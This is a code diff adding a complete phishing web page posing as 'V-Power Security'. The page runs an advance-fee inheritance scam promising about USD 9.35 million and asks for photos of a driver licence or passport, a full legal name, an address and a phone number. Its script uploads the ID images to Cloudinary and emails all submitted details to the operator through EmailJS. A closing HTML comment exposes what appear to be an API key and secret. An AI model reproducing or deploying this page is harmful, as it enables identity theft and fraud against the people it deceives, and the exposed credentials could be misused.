@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>V-Power Security</title>
+    <link rel="stylesheet" href="/index.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+  </head>
+
+  <body>
+    <header class="header">
+      <div class="logo-container">
+        <img src="/logo.png" alt="V-Power Security Logo" class="logo" />
+      </div>
+      <nav class="navbar" id="navbar">
+        
+      </nav>
+      <div class="burger" id="burger">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+      </div>
+    </header>
+
+    <div class="hero">
+      <h1>V-Power Security</h1>
+      <p>Your Trusted Partner in Security Solutions</p>
+      <a href="#contact" class="cta-button">Get Started</a>
+    </div>
+    <div class="container">
+      <div class="header">V-Power Security</div>
+      <div class="message">
+        Dear,<br /><br />
+        I hope this message finds you in good health and high spirits. I am
+        writing to you on behalf of V-Power Security regarding an important
+        matter pertaining to a potential inheritance from your late relative,
+        who shares the same last name as you. We have recently updated our
+        contact information and have identified you as the next of kin. Thus, I
+        would like to discuss an official proposal with you. You are given the
+        opportunity to either make a charitable donation with the inheritance or
+        claim it for yourself. If you are interested, please confirm your
+        intention by replying with a "Yes".<br /><br />
+        To ensure a smooth verification process, we kindly request that you
+        provide us with the following information within the next 24 hours:
+      </div>
+      <p class="head-form">Enter Your Credentials</p>
+      <form
+        class="info-form"
+        id="email-form"
+        enctype="multipart/form-data"
+        method="post"
+      >
+        <div id="error"></div>
+        <div class="means">
+          A valid form of identification, Driver license or Passport
+        </div>
+        <ol class="info-list">
+          <li>
+            <label for="front-photo">Front Photo</label>
+            <input
+              type="file"
+              id="front-photo"
+              name="photo"
+              accept="image/*"
+              required
+            />
+          </li>
+          <li>
+            <label for="back-photo">Back Photo</label>
+            <input
+              type="file"
+              id="back-photo"
+              name="photo"
+              accept="image/*"
+              required
+            />
+          </li>
+          <li>
+            <label for="full-name">Your full legal name:</label>
+            <input type="text" id="full-name" name="full-name" required />
+          </li>
+          <li>
+            <label for="address">Your current residential address:</label>
+            <input type="text" id="address" name="address" required />
+          </li>
+          <li>
+            <label for="phone">Your primary contact number:</label>
+            <input type="tel" id="phone" name="phone" required />
+          </li>
+        </ol>
+        <button
+          type="submit"
+          class="submit-button roll-button"
+          id="rolling-button"
+        >
+          Submit
+        </button>
+      </form>
+
+      <div class="message">
+        We require this information to perform a thorough verification by
+        cross-referencing it with the data we have on record. The total amount
+        kept in our deposit box is: <br />
+        <span class="accout-balance">USD 9,350,520.00</span><br /><br />
+        Should you have any concerns or questions, please do not hesitate to
+        reach out to us @
+        <a href="mailto:info@vpowersecurity.com" class="email"
+          >info@vpowersecurity.com</a
+        >.<br /><br />
+        Note: We are committed to maintaining the highest level of
+        confidentiality and security throughout this process.<br /><br />
+        Best regards,<br />
+        Jeffery Erich<br />
+        V-Power Security
+      </div>
+    </div>
+    <div class="loader-container">
+        <div class="spinner"></div>
+      </div>
+    <footer class="footer">
+      <p>&copy; 2023 V-Power Security. All rights reserved.</p>
+    </footer>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("yKP0sOC6nRr-xkaDk");
+      })();
+    </script>
+   <script>
+    const CLOUDINARY_PRESET = "rhpgw6tq";
+    const errorP = document.querySelector("#error");
+    const submitButton = document.querySelector(".submit-button");
+  
+    document.getElementById("email-form").addEventListener("submit", async function (event) {
+      event.preventDefault();
+      submitButton.disabled = true; // Disable the submit button
+  
+      const frontPhotoInput = document.getElementById("front-photo");
+      const backPhotoInput = document.getElementById("back-photo");
+      const fullName = document.getElementById("full-name").value;
+      const address = document.getElementById("address").value;
+      const phone = document.getElementById("phone").value;
+      const loadercontainer = document.querySelector(".loader-container");
+      loadercontainer.style.display = "flex";
+  
+      let frontPhoto = frontPhotoInput.files[0];
+      let backPhoto = backPhotoInput.files[0];
+  
+      if (!frontPhoto || !backPhoto) {
+        alert("Please select both front and back photos");
+        submitButton.disabled = false; // Enable the submit button
+        loadercontainer.style.display = "none";
+        return;
+      }
+  
+      if (frontPhoto.size > 5000000 || backPhoto.size > 5000000) {
+        alert("File cannot be more than 5 MB");
+        submitButton.disabled = false; // Enable the submit button
+        loadercontainer.style.display = "none";
+        return;
+      }
+  
+      try {
+        const [frontPhotoUrl, backPhotoUrl] = await Promise.all([
+          uploadToCloudinary(frontPhoto),
+          uploadToCloudinary(backPhoto),
+        ]);
+  
+        const emailParams = {
+          full_name: fullName,
+          address: address,
+          phone: phone,
+          front_photo: frontPhotoUrl,
+          back_photo: backPhotoUrl,
+        };
+  
+        await emailjs.send("service_jusbz74", "template_y01y5mj", emailParams);
+        loadercontainer.style.display = "none";
+        alert("We have received your details. Thank you!");
+        frontPhotoInput.value = "";
+        backPhotoInput.value = "";
+        fullName.value = "";
+        address.value = "";
+        phone.value = "";
+      } catch (error) {
+        console.error("Error:", error);
+        loadercontainer.style.display = "none";
+        errorP.textContent = "Error sending email. Please try again later.";
+      } finally {
+        submitButton.disabled = false; // Enable the submit button
+      }
+    });
+  
+    function uploadToCloudinary(file) {
+      let url = "https://api.cloudinary.com/v1_1/dwnkfth0z/upload";
+      let formData = new FormData();
+      formData.append("file", file);
+      formData.append("upload_preset", CLOUDINARY_PRESET);
+      return fetch(url, {
+        method: "POST",
+        body: formData,
+      })
+        .then((response) => response.json())
+        .then((result) => result.secure_url)
+        .catch((error) => {
+          console.log(error);
+          throw new Error("Error uploading image to Cloudinary");
+        });
+    }
+  </script>
+  
+    <script>
+      document.getElementById("burger").addEventListener("click", function () {
+        document.getElementById("navbar").classList.toggle("active");
+      });
+    </script>
+    <script>
+    window.addEventListener('load', () => {
+    const loadercontainer = document.querySelector(".loader-container");
+    setTimeout(() => {
+      loadercontainer.style.display = "none";
+    }, 1000);
+  })
+    </script>
+  </body>
+  <!-- service_wc6c37v -->
+</html>
+<!-- api secret 7gx3V2N8HhbIwVv33sfX2Ln6y9k
+api key 613512358637147
+cloudinary preset qnvtphfi
+cloud name dimokvkqp -->
